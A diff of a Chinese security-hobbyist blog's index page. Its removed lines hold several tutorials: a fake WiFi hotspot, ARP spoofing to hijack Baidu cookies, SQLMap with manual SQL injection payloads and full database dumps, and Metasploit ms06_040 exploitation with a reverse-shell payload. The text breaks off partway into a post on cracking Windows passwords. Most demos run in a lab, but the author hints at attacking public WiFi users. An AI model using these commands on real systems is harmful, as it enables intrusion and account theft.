-<p>　　　　中间蛋疼的 地方倒是 Py 的 转义符号问题  身边能有个可以问问的大牛多好~</p>
-<p>　　　　后期 准备使用 <a href="http://dns.aizhan.com/" target="_blank" rel="external">http://dns.aizhan.com/</a> 的查询结果 直接获得 IP以及旁站信息</p>
-<p>　　　　==================6.13号更新====================</p>
-<p>　　　　现在已经可以查出二级域名对应的IP地址以及地理位置信息</p>
-<p>　　　　感觉<a href="http://dns.aizhan.com" target="_blank" rel="external">http://dns.aizhan.com</a> 的调用比较麻烦，接口已经换成 <a href="http://www.ip138.com" target="_blank" rel="external">http://www.ip138.com</a></p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-
-  <div class="article-tags">
+    <a href="/2016/03/02/printer-hack/" title="HP 打印机 PCL 漏洞分析与利用" itemprop="url">
   
-  <span></span> <a href="/tags/信息收集/">信息收集</a><a href="/tags/Python脚本/">Python脚本</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/2015/06/10/python-spider-subdomain-ip/#comments" class="ds-thread-count comments-count-link" data-thread-key="2015/06/10/python-spider-subdomain-ip/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
+    <h1 itemprop="name">HP 打印机 PCL 漏洞分析与利用</h1>
     
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
+     
+           <p itemprop="description" >0x01 漏洞概要PCL代表打印机控制语言（Printer Control Language），由惠普公司开发，并被广泛使用的一种打印机协议。关于另一种页面描述语言，应该提一提由Adobe设计的PostScript（PS），它可以将更为复杂的事情交由绘图仪/打印机处理。PJL (</p>
+        
     
-      <a href="/2015/01/02/fake-wifi-ap/" title="搭建假冒 WIFI 热点等小(mei)白(zhi)兔(men)来蹭网啊 - -。" itemprop="url">搭建假冒 WIFI 热点等小(mei)白(zhi)兔(men)来蹭网啊 - -。</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="Anka9080" target="_blank" itemprop="author">Anka9080</a>
-		
-  <p class="article-time">
-    <time datetime="2015-01-02T08:58:22.000Z" itemprop="datePublished"> Published 2015-01-02</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <p><img src="http://images.cnitblog.com/blog/671902/201501/021952499038190.png" alt=""></p>
-<h2 id="0x-00-╮-╯▽╰-╭"><a href="#0x-00-╮-╯▽╰-╭" class="headerlink" title="0x 00 ╮(╯▽╰)╭"></a>0x 00 ╮(╯▽╰)╭</h2><p>　　　　请喊我万恶的标题党  哈哈哈哈哈</p>
-<h2 id="0x-01-这里正题"><a href="#0x-01-这里正题" class="headerlink" title="0x 01 这里正题"></a>0x 01 这里正题</h2><p>　　　　虚拟机（Kali）不支持内置网卡，还好我有神器，插上我的RT8187L，开始搞起</p>
-<p>　　　　参考资料：zone.wooyun.org/content/2562</p>
-<p>　　　　下面看攻击测试吧</p>
-<p><img src="http://images.cnitblog.com/blog/671902/201501/021935161229360.png" alt=""></p>
-<p><img src="http://images.cnitblog.com/blog/671902/201501/021935253561039.png" alt=""></p>
-<p><img src="http://images.cnitblog.com/blog/671902/201501/021935329503719.png" alt=""></p>
-<p><img src="http://images.cnitblog.com/blog/671902/201501/021935449192896.png" alt=""></p>
-<p><img src="http://images.cnitblog.com/blog/671902/201501/021935568416087.png" alt=""></p>
-<p><img src="http://images.cnitblog.com/blog/671902/201501/021936083251879.png" alt=""></p>
-<p><strong>　　　　显示热点链接信息</strong></p>
-<p><img src="http://images.cnitblog.com/blog/671902/201501/021936204505541.png" alt=""></p>
-<p><strong>　　　　手机链接假冒热点（Fake-Anka）</strong></p>
-<p><img src="http://images.cnitblog.com/blog/671902/201501/021936552785800.png" alt=""></p>
-<p><img src="http://images.cnitblog.com/blog/671902/201501/021937520911745.png" alt=""></p>
-<p><strong>　手机浏览网页截图</strong></p>
-<p><img src="http://images.cnitblog.com/blog/671902/201501/021938143257184.png" alt=""></p>
-<p><strong>　电脑端通过driftnet程序截获的图片</strong></p>
-<p><img src="http://images.cnitblog.com/blog/671902/201501/021939201539106.png" alt=""></p>
-<p>　　　　上面仅仅是截了张图片验证成功</p>
-<p>　　　　当然你可以在ettercap抓获Cookie信息进行会话劫持</p>
-<p>　　　　然后你懂得…..</p>
-<p>　　　　鉴于KFC，MDL等等 WIFI 一大堆，可行性还是很高的</p>
-<p>　　　　可以去想一下，如果假冒的热点名和KFC原先的热点名相同，结果会怎么样 : )</p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
+    <time datetime="2016-03-02T09:46:18.000Z" itemprop="datePublished">2016-03-02</time>
+  </a>
+</section>
 
 
-  <div class="article-tags">
+
+
+
+
   
-  <span></span> <a href="/tags/kali/">kali</a><a href="/tags/WIFI热点伪造/">WIFI热点伪造</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/2015/01/02/fake-wifi-ap/#comments" class="ds-thread-count comments-count-link" data-thread-key="2015/01/02/fake-wifi-ap/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2015/01/02/arpspoof/" title="内网 ARP 欺骗劫持 Cookie 登入百度" itemprop="url">内网 ARP 欺骗劫持 Cookie 登入百度</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="Anka9080" target="_blank" itemprop="author">Anka9080</a>
-		
-  <p class="article-time">
-    <time datetime="2015-01-02T08:42:41.000Z" itemprop="datePublished"> Published 2015-01-02</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h2 id="0x-00-ARP欺骗说明"><a href="#0x-00-ARP欺骗说明" class="headerlink" title="0x 00 ARP欺骗说明"></a>0x 00 ARP欺骗说明</h2><p>欺骗原理相关内容就不多叙述了，Google一大堆</p>
-<p>实施ARP欺骗在 Windows 下， Linux 下都相关工具</p>
-<p>由于在 Linux 下可以开启 ip_forward 功能，个人认为 Linux 下的工具作用效果比较好，本次测试是在Kali（Linux）中进行</p>
-<h2 id="0x-01-攻击测试"><a href="#0x-01-攻击测试" class="headerlink" title="0x 01 攻击测试"></a>0x 01 攻击测试</h2><p><strong>1、 攻击拓扑</strong></p>
-<p>　　　　攻击机：Kali Linux    IP：192.168.1.109</p>
-<p>　　　　受害机：Win 7 64位　　IP：192.168.1.106</p>
-<p>　　　　网关IP： 192.168.1.1</p>
-<p>　　　　攻击工具：arpspoof，tcpdump，hamster，ferret</p>
-<p>　　　　前三款工具已经集成在Kali中，ferret需要手动安装</p>
-<p><strong>2、 安装ferret</strong></p>
-<p>(1) 修改正确的软件安装源<br>(2) 添加Kali对32位应用程序的支持</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg --add-architecture i386</span><br></pre></td></tr></table></figure>
-<p>(3) 更新安装源</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get dist-upgrade -y</span><br></pre></td></tr></table></figure>
-<p>(4) 安装ferret</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aptitude install ferret-sidejack:i386</span><br></pre></td></tr></table></figure>
-<p><strong>3、 打开路由转发（临时生效）</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"1"</span> &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
-<p><strong>4、 开始 ARP 欺骗</strong></p>
-<p><img src="http://images.cnitblog.com/blog/671902/201501/021846569813530.png" alt=""></p>
-<p><strong>5、 新开一个Shell，抓取通过eth0接口的输出cookie.cap文件</strong></p>
-<p><img src="http://images.cnitblog.com/blog/671902/201501/021849080915177.png" alt=""></p>
-<p><strong>6、 受害机使用浏览器模拟百度账号登陆过程，或刷新已经登录的页面</strong></p>
-<p><strong>7、 结束第4，第5步打开的进程</strong></p>
-<p><strong>8、 使用ferret处理抓到包cookie.cap</strong></p>
-<p><img src="http://images.cnitblog.com/blog/671902/201501/021853019349701.png" alt=""></p>
-<p><strong>9、 架设hamster代理服务器</strong></p>
-<p><img src="http://images.cnitblog.com/blog/671902/201501/021853380596231.png" alt=""></p>
-<p><strong>10、 浏览器设置代理后，重启浏览器访问127.0.0.1:1234</strong></p>
-<p><img src="http://images.cnitblog.com/blog/671902/201501/021854197311801.png" alt=""></p>
-<p><img src="http://images.cnitblog.com/blog/671902/201501/021855181067000.png" alt=""></p>
-<p>　　在上面可以看到截取的Cookie信息，打开链接就可以了</p>
-<p>　　PS：就不打码了，  大虾手下留情 - -。</p>
-<p><strong>11、 测试攻击效果</strong></p>
-<p>进贴吧发留言测试一下 ~~</p>
-<p><img src="http://images.cnitblog.com/blog/671902/201501/021858075136845.png" alt=""></p>
-<p><img src="http://images.cnitblog.com/blog/671902/201501/021858173252882.png" alt=""></p>
-<p><strong>Summary：</strong></p>
-<p>　　　　这种局域网ARP劫持是因为ARP协议设计缺陷被动更新ARP缓存表造成，不是很好防范</p>
-<p>　　　　可以在路由器里静态绑定ARP条目减少避免危害</p>
-<p>　　　　如果目标网站的安全性做的很好，劫持后拿到的Cookie也很难成功利用</p>
-<p>　　　　安全是多方的，服务提供方和使用者都应该做出安全措施</p>
-<p>　　　　最重要的是 见到匿名热点神马的不要随随便便就连上啊</p>
-<p>　　　　很可能下一个小白鼠就是你…..　　　</p>
-<p>　　　</p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-
-  <div class="article-tags">
+<section class="post" itemscope itemprop="blogitem">
   
-  <span></span> <a href="/tags/Kali/">Kali</a><a href="/tags/Cookie劫持/">Cookie劫持</a><a href="/tags/内网渗透/">内网渗透</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/2015/01/02/arpspoof/#comments" class="ds-thread-count comments-count-link" data-thread-key="2015/01/02/arpspoof/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2014/11/26/sqlmap/" title="SQL注入利用神器 SQLMap 的介绍与 Demo" itemprop="url">SQL注入利用神器 SQLMap 的介绍与 Demo</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="Anka9080" target="_blank" itemprop="author">Anka9080</a>
-		
-  <p class="article-time">
-    <time datetime="2014-11-26T08:05:01.000Z" itemprop="datePublished"> Published 2014-11-26</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <p><img src="http://images.cnitblog.com/blog/671902/201411/261959526067077.jpg" alt=""></p>
-<h2 id="0x-00-前言"><a href="#0x-00-前言" class="headerlink" title="0x 00　前言"></a>0x 00　前言</h2><p>正是SQLMAP这种神器的存在，SQL注入简直Easy到根本停不下来….</p>
-<p>PS：国内类似软件也有阿D，明小子，挖掘机，当你用过他们之后你才会发现SQLMap才是绝对的注入神器</p>
-<h2 id="0x-01-注入原理"><a href="#0x-01-注入原理" class="headerlink" title="0x 01 注入原理"></a>0x 01 注入原理</h2><p>存在注入的原因是因为后台在编写程序时，没有对用户输入的数据做过滤导致的，正如事实上，不是所有的用户都是友好的</p>
-<p>比如：用户在某个输入框提交的参数是 2</p>
-<p>　　　浏览器提交的URL为: http:// www.XXX.com/index.php?id=2</p>
-<p>　　　服务器后台执行SQL语句： select * from table1 where id = 2</p>
-<p>　　　返回Response，浏览器解析返回的页面，然后你就看到新的页面了</p>
-<p>　　　如果邪恶的用户提交的参数是 2;drop table1</p>
-<p>　　　　　 服务器后台执行SQL语句： select * from table1 where id =2 ; drop table1</p>
-<p>　　　　　 相当于后台执行了两条SQL语句，查表，并且把table1删除 - -</p>
-<p>　　　　　　从而导致了SQL注入。</p>
-<p>按照这个思路，现在写一下手工注入的一般步骤：</p>
-<p><strong>1、 判断是否存在注入点（数字型注入）</strong></p>
-<p>　　　　www.XXX.com/index.php?id=2‘–</p>
-<p>　　　　www.XXX.com/index.php?id=2 and 1=1  –</p>
-<p>　　　　www.XXX.com/index.php?id=2 and 1=2 –</p>
-<p>　　　　第2条返回正常，第1，3条返回不正常说明id参数存在注入漏洞</p>
-<p><strong>2、 判断数据库类型</strong></p>
-<p>　　　　可以根据不同数据库特有的表，或者根据不同数据库的语法不同进行判断</p>
-<p>　　　　www.XXX.com/index.php?id=2 and exists(select * from sysobjects) –      返回正常是SQLServer 数据库</p>
-<p>　　　　www.XXX.com/index.php?id=2 and exists(select * from msysobjects) –     返回正常是Access 数据库</p>
-<p>　　　　www.XXX.com/index.php?id=2 and len(‘a’) = 1 –　　返回正常是SQLServer或者MySQL</p>
-<p>　　　　www.XXX.com/index.php?id=2 and substring(‘abc’,’1’,’1’) = a –　　返回正常是SQLServer</p>
-<p>　　　　www.XXX.com/index.php?id=2 and subStr(‘abc’,’1’,’1’)= a –　　返回正常是Oracle</p>
-<p>　　　　知道是哪种类型数据库后就可以选择对应语法构造SQL语句进行攻击</p>
-<p><strong>3、 判定是否存在admin表</strong></p>
-<p>　　　　www.XXX.com/index.php?id=2 and exists(select * from admin) –  返回正常 存在admin表</p>
-<p><strong>4、猜admin表中的字段名</strong></p>
-<p>　　　　www.XXX.com/index.php?id=2 and exists(select username from admin) –  返回正常 表示admin表存在username字段</p>
-<p><strong>5、 猜字段值</strong></p>
-<p>　　　　www.XXX.com/index.php?id=2 and exists(select * from admin where id =1 and asc(mid(username,1,1))) &lt; 100 – 返回正常说明username中有ascii码小于100的字母，然后根据折半发准确判断是哪一个字符</p>
-<p>　　以上是 SQLServer的手工注入步骤，在MySQL和Oracle中略有不同，思路还是这个样子~~</p>
-<h2 id="0x-02-安装SQLMap"><a href="#0x-02-安装SQLMap" class="headerlink" title="0x 02 安装SQLMap"></a>0x 02 安装SQLMap</h2><p><strong>1. 安装python </strong> </p>
-<p>　　　　官网<a href="https://www.python.org/" target="_blank" rel="external">https://www.python.org/</a> 选择最新版本下载安装即可</p>
-<p>　　　　因为SQLMap使用Python写的 ，所以没有Python的环境SQLMap无法运行</p>
-<p><strong>2. 安装SQLMap</strong></p>
-<p>　　　　官网 <a href="http://sqlmap.org/" target="_blank" rel="external">http://sqlmap.org/</a> 选择最近版本安装即可</p>
-<p><strong>3. 设置环境变量</strong></p>
-<p>　　　　为了使用便利，将SQLMAP的安装目录添加到系统环境变量中</p>
-<p>　　　　之后在CMD中就可以直接使用SQLMap了</p>
-<p>　　　　不设置环境变量的话，要把CMD的当前目录切换到SQLMap安装目录才可以使用</p>
-<h2 id="0x-03-SQLMap常用命令介绍"><a href="#0x-03-SQLMap常用命令介绍" class="headerlink" title="0x 03 SQLMap常用命令介绍"></a>0x 03 SQLMap常用命令介绍</h2><pre><code>1. sqlmap.py -u &quot;http://www.XXX.com/index.asp?id=1&quot;  
-</code></pre><p>判断id参数是否存在注入：结果中包含 “id” is Vulnerable  字段表示存在注入</p>
-<p>存在注入，下面的步骤才可以执行成功~</p>
-<pre><code>2. sqlmap.py -u &quot;http://www.XXX.com/index.asp?id=1&quot;  --dbs
-</code></pre><p>列举能列出的所有数据库名</p>
-<pre><code>3.  sqlmap.py -u &quot;http://www.XXX.com/index.asp?id=1&quot; --current-db
-</code></pre><p>列出当前使用的数据库名，假设列出“sqltest”数据库　　</p>
-<pre><code>4.  sqlmap.py -u &quot;http://www.XXX.com/index.asp?id=1&quot;  --is-dba
-</code></pre><p>判断该注入点是否有管理员权限：返回true  表示是管理员</p>
-<pre><code>5.  sqlmap.py -u &quot;http://www.XXX.com/index.asp?id=1&quot; -D &quot;sqltest&quot; --tables
-</code></pre><p>获取sqltest中的所有表，假设有”admin”表</p>
-<pre><code>6.  sqlmap.py -u &quot;http://www.XXX.com/index.asp?id=1&quot; -D &quot;sqltest&quot; -T &quot;admin&quot; --columns
-</code></pre><p>列举表admin的字段（列名），假设存在”username”,”password”字段</p>
-<pre><code>7.  sqlmap.py -u &quot;http://www.XXX.com/index.asp?id=1&quot; -D &quot;sqltest&quot; -T &quot;admin&quot; -C &quot;username,password&quot; --dump
-</code></pre><p>下载字段 username，password 的值，若询问是否破解 md5 加密，选择 no 即可</p>
-<p>至此，对一个简单的注入点（GET方式），现在就已经得到了我们想要的数据</p>
-<p>想看工具的注入过程 使用-v参数</p>
-<p><strong>–level</strong> 设置注入等级（1-5）</p>
-<ul>
-<li>默认1 只会判断get，post参数是否有注入点</li>
-<li>为2或者2以上的时候也会测试HTTP Cookie头的值</li>
-<li>为3或者3以上的时候会尝试对User-Agent,referer注入</li>
-<li>若不确定注入点设置 –level 为 5</li>
-</ul>
-<p><strong>–risk</strong> 设置风险等级（1-4）</p>
-<ul>
-<li>默认是1会测试大部分的测试语句</li>
-<li>为2会增加基于事件的测试语句</li>
-<li>为3会增加OR语句的SQL注入测试</li>
-</ul>
-<p>当然用burp Suite架个代理，截取数据包，直接 -r 参数引入数据包也可以完成上述的注入情况的，命令如下:</p>
-<pre><code>sqlmap.py -r &quot;request.txt&quot; --level 5
-</code></pre><h2 id="0x-04-注入Demo"><a href="#0x-04-注入Demo" class="headerlink" title="0x 04 注入Demo"></a>0x 04 注入Demo</h2><p>本次演示使用Apache+Php +Mysql 环境，其他环境的话</p>
-<p>使用SQLMap输入还是相同的命令，这点SQLMap做的好方便</p>
-<ul>
-<li>sqlmap.py -u “<a href="http://127.0.0.1/sqlinject.php?id=1" target="_blank" rel="external">http://127.0.0.1/sqlinject.php?id=1</a>“  //测试id是否可以注入</li>
-</ul>
-<p><img src="http://images.cnitblog.com/blog/671902/201411/261939392155508.jpg" alt=""></p>
-<ul>
-<li>sqlmap.py -u “<a href="http://127.0.0.1/sqlinject.php?id=1" target="_blank" rel="external">http://127.0.0.1/sqlinject.php?id=1</a>“ –dbs //列所有数据库名</li>
-</ul>
-<p><img src="http://images.cnitblog.com/blog/671902/201411/261940441993789.jpg" alt=""></p>
-<ul>
-<li>sqlmap.py -u “<a href="http://127.0.0.1/sqlinject.php?id=1" target="_blank" rel="external">http://127.0.0.1/sqlinject.php?id=1</a>“ –current-db //列出当前数据库</li>
-</ul>
-<p><img src="http://images.cnitblog.com/blog/671902/201411/261941382463776.jpg" alt=""></p>
-<ul>
-<li>sqlmap.py -u “<a href="http://127.0.0.1/sqlinject.php?id=1" target="_blank" rel="external">http://127.0.0.1/sqlinject.php?id=1</a>“ –is-dba 　　//判断注入点是否有管理员权限</li>
-</ul>
-<p><img src="http://images.cnitblog.com/blog/671902/201411/261942196524361.jpg" alt=""></p>
-<ul>
-<li>sqlmap.py -u “<a href="http://127.0.0.1/sqlinject.php?id=1" target="_blank" rel="external">http://127.0.0.1/sqlinject.php?id=1</a>“ -D “test” –tables　　//猜表名</li>
-</ul>
-<p><img src="http://images.cnitblog.com/blog/671902/201411/261942529966406.jpg" alt=""></p>
-<ul>
-<li>sqlmap.py -u “<a href="http://127.0.0.1/sqlinject.php?id=1" target="_blank" rel="external">http://127.0.0.1/sqlinject.php?id=1</a>“ -D “test” -T “test” –columns　　//猜字段名</li>
-</ul>
-<p><img src="http://images.cnitblog.com/blog/671902/201411/261943453716638.jpg" alt=""></p>
-<ul>
-<li>sqlmap.py -u “<a href="http://127.0.0.1/sqlinject.php?id=1" target="_blank" rel="external">http://127.0.0.1/sqlinject.php?id=1</a>“ -D “test” -T “test” -C “id,name”　–dump　//猜id和name的值</li>
-</ul>
-<p><img src="http://images.cnitblog.com/blog/671902/201411/261944583246786.jpg" alt=""></p>
-<p>　　　　网络上流传的脱裤 用的可就是下面的一句话</p>
-<p>　　　<strong>　sqlmap.py -u “<a href="http://127.0.0.1/sqlinject.php?id=1" target="_blank" rel="external">http://127.0.0.1/sqlinject.php?id=1</a>“ -D “test” –dump-all</strong></p>
-<p>　　　　突然发现 强大的东西往往仅仅是一句话 ! !</p>
-<p>　　　　这条命令会直接把test数据库中所有的表全部下载到安装目录output文件夹中</p>
-<p>　　　　然后就有了  2000W  xxx 800W xxx ………………..你懂得 </p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-
-  <div class="article-tags">
+    <a href="/2015/07/10/github-cmd/" title="GitHub 常用命令备忘录" itemprop="url">
   
-  <span></span> <a href="/tags/安全工具/">安全工具</a><a href="/tags/SQLMap/">SQLMap</a><a href="/tags/SQL注入/">SQL注入</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/2014/11/26/sqlmap/#comments" class="ds-thread-count comments-count-link" data-thread-key="2014/11/26/sqlmap/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
+    <h1 itemprop="name">GitHub 常用命令备忘录</h1>
     
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
+     
+           <p itemprop="description" >git init 把当前目录变成Git可以管理的仓库随后出现.git目录，这个目录是Git来跟踪管理版本库的git commit -m “change message” 提交代码到Gitgit add file1.txtgit add file2.txt 先添加多个文件 之后一起</p>
+        
     
-      <a href="/2014/11/26/nessus/" title="Nessus 多功能扫描器" itemprop="url">Nessus 多功能扫描器</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="Anka9080" target="_blank" itemprop="author">Anka9080</a>
-		
-  <p class="article-time">
-    <time datetime="2014-11-26T07:53:11.000Z" itemprop="datePublished"> Published 2014-11-26</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h2 id="0x-00-前言"><a href="#0x-00-前言" class="headerlink" title="0x 00 前言"></a>0x 00 前言</h2><p>　　写这篇博客，证明我还活着……</p>
-<h2 id="0x-01-安装Nessus"><a href="#0x-01-安装Nessus" class="headerlink" title="0x 01 安装Nessus"></a>0x 01 安装Nessus</h2><p>　　直接官网  <a href="http://www.tenable.com/products/nessus/select-your-operating-system" target="_blank" rel="external">www.tenable.com/products/nessus/select-your-operating-system</a></p>
-<p>　　选择Nessus Home版下载，下载之后点击安装我这里是Nessus-6.1.0-x64版（附件处有百度网盘链接）</p>
-<p>　　安装开始设置一个用户名和密码（记住，使用Nessus时会验证）</p>
-<p>　　然后选择文件安装目录</p>
-<p>　　之后会提示更新插件，这个要通过官网注册获取激活码来更新的</p>
-<p>　　在官网 <a href="http://www.tenable.com/products/nessus/evaluate" target="_blank" rel="external">www.tenable.com/products/nessus/evaluate</a> 注册账户，打开注册邮箱就可以收到激活码了~</p>
-<p>　　注意：注册邮箱不能使用 qq\163\gmail\hotmail 等公共邮箱，要用企业邮箱才可以</p>
-<p>　　在这里推荐使用“一小时邮箱”进行注册，具体使用方法自行 Google</p>
-<p>　　填好激活码之后，插件自动更新，我这里5分钟左右就更新好了</p>
-<h2 id="0x-02-软件使用"><a href="#0x-02-软件使用" class="headerlink" title="0x 02  软件使用"></a>0x 02  软件使用</h2><p>　　　　浏览器打开  <a href="https://localhost:8834" target="_blank" rel="external">https://localhost:8834</a>   后显示客户端界面</p>
-<p>　　　　输入先前设置的用户名密码登录</p>
-<p><strong>1. 扫描局域网存活主机</strong></p>
-<p>　　　　点击 <strong>“New Scan”</strong>，</p>
-<p>　　　　在提供的默认模版里选择一个模版，这里选择 <strong>“Host Discovery”</strong>，</p>
-<p>　　　　在弹出的通用配置里设置 <strong>“Name”</strong>（本次扫描的名字）， <strong>“Target”</strong>（扫描目标）</p>
-<p>　　　　我扫的是 192.168.1.1 全网段的 ，看图</p>
-<p><img src="http://images.cnitblog.com/blog/671902/201411/252347480594236.jpg" alt=""></p>
-<p>　　　　之后“点击保存”后会进行自动扫描</p>
-<p>　　　　2分钟之后结果就来了，在这里</p>
-<p><img src="http://images.cnitblog.com/blog/671902/201411/252350299349615.jpg" alt=""></p>
-<p>　　　　看到了米有，9个主机在线，测试结果与真实环境相同的</p>
-<p>　　　　NMAP也能完成主机探测我会乱说，所以说Nessus牛的地方不是在这，所以下面来了</p>
-<p><strong>2. 主机扫描</strong></p>
-<p>　　　　我在本地搭了个低版本服务器，IP为192.168.1.112</p>
-<p>　　　　新建扫描，设置扫描策略为“Advanced Scan”，</p>
-<p>　　　　然后 “Target”填上192.168.1.112</p>
-<p>　　　　因为扫的是同个局域网内的速度还是比较快的，结果倒是让我惊呆了Orz…</p>
-<p><img src="http://images.cnitblog.com/blog/671902/201411/260017182468732.jpg" alt=""></p>
-<p>　　　　20个紧急漏洞，8个高危漏洞，醉了有木有 = =  速度戳之</p>
-<p><img src="http://images.cnitblog.com/blog/671902/201411/260019207935627.jpg" alt=""></p>
-<p>　　　　上面MSxx-xxx是微软漏洞编码，随随便便选择一个找到Exp就可以愉悦的玩耍了  ~~</p>
-<p>　　　　接下来漏洞结合MSF进行漏洞利用~</p>
-<p>　　　　当然，直接根据漏洞的编码百度一下利用方法也是可以的，这里就直接用BT5吧</p>
-<p>　　　　找一个比较老的洞：<strong>ms06-040</strong></p>
-<p>　　　　BT5/Kali 的 CMD 输入 msfconsole 进入MSF欢迎界面（时间略长，等下就OK了）</p>
-<p>　　　　我们按照MSF的一般执行过程来操作</p>
-<blockquote>
-<p>选择漏洞模块 —&gt; 设置PAYLOAD —&gt; 设置参数 —&gt; 攻击</p>
-</blockquote>
-<pre><code>search ms06_040  // 搜索模块
-</code></pre><p>　　　　找到对应模块后 </p>
-<pre><code>use exploit/windows/smb/ms06_040_netapi  // 使用ms06_040_netapi模块
-show options        // 查看漏洞配置信息
-set PAYLOAD windows/shell/reverse_tcp      // 设置PAYLOAD
-set RHOST 192.168.1.112    // 设置目标IP
-set LHOST 192.168.1.117    // 设置本机IP
-// 端口号 和 目标类型 默认就OK了
-exploit        // 进行攻击
-</code></pre><p>　　　　然后看拿到拿到了神马……</p>
-<p><img src="http://images.cnitblog.com/blog/671902/201411/260127053249291.jpg" alt=""></p>
-<p>附件:</p>
-<p>　　<strong>Nessus-6.1.0-x64</strong>　　百度网盘：pan.baidu.com/s/1hq48j20      9fgu</p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
+    <time datetime="2015-07-10T09:42:04.000Z" itemprop="datePublished">2015-07-10</time>
+  </a>
+</section>
 
 
-  <div class="article-tags">
+
+
+
+
   
-  <span></span> <a href="/tags/安全工具/">安全工具</a><a href="/tags/Nessus/">Nessus</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/2014/11/26/nessus/#comments" class="ds-thread-count comments-count-link" data-thread-key="2014/11/26/nessus/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2014/10/25/pojie-windows-login/" title="破解 Windows 7/8 登录密码" itemprop="url">破解 Windows 7/8 登录密码</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="Anka9080" target="_blank" itemprop="author">Anka9080</a>
-		
-  <p class="article-time">
-    <time datetime="2014-10-25T07:27:16.000Z" itemprop="datePublished"> Published 2014-10-25</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <p><img src="http://images.cnitblog.com/blog/671902/201410/251855363714539.jpg" alt=""></p>
-<blockquote>
-<p>// 文末有惊喜：）</p>
-</blockquote>
-<h2 id="0x-00-破解思路"><a href="#0x-00-破解思路" class="headerlink" title="0x 00 破解思路"></a>0x 00 破解思路</h2><p>用户的明文密码经过单向Hash加密生成Hash散列，Hash散列又被加密存放在系统盘\Windiws\System32\config文件下</p>
-<p>要获得明文就要先得到SAM文件，从中提取出hash散列，然后网上查询或者暴力破解获得明文密码</p>
-<p>　　　　SAM文件的获取可分为两种方法：</p>
-<p>　　　　　　1）直接从本机操作系统获取；</p>
-<p>　　　　　　2） 利用安装了Linux（或是WinPE）的U盘获取；</p>
-<p>获得SAM文件以后可以很简单的提取到用户的hash散列，然后就是破解部分了</p>
-<p>直接上hash破解网站，让网站解密，简单粗暴，不过需要Money~</p>
-<p>也可以在本机暴力破解，因为单项加密的不可逆性</p>
-<p>破解过程实际上是一堆字母组合做hash加密，得到的结果与密文做对比</p>
-<p>并不是真正的破解，还好计算机有强大的计算能力 = =！</p>
-<h2 id="0x-01-破解测试"><a href="#0x-01-破解测试" class="headerlink" title="0x 01 破解测试"></a>0x 01 破解测试</h2><p>环境&gt;&gt;</p>
-<p>　　　　被破解主机：win 7 旗舰版 64位</p>
-<p>　　　　工具：bkhive（生成bootkey文件 用于提取hash散列）</p>
-<p>　　　　　　　    samdump2 （提取hash工具）</p>
-<p>　　　　　　  　  john （暴力破解hash得明文）</p>
-<p>　　　　上面三个工具都已经集成在U盘(kali)中</p>
-<p>由于亲测Win8和 Win7 的加密算法一样，加密文件存放位置也是相同的 这里就演示Win7下的</p>
-<p><strong>1、 生成被破解账户</strong></p>
-<p>Win7 CMD下，创建两个待破解用户</p>
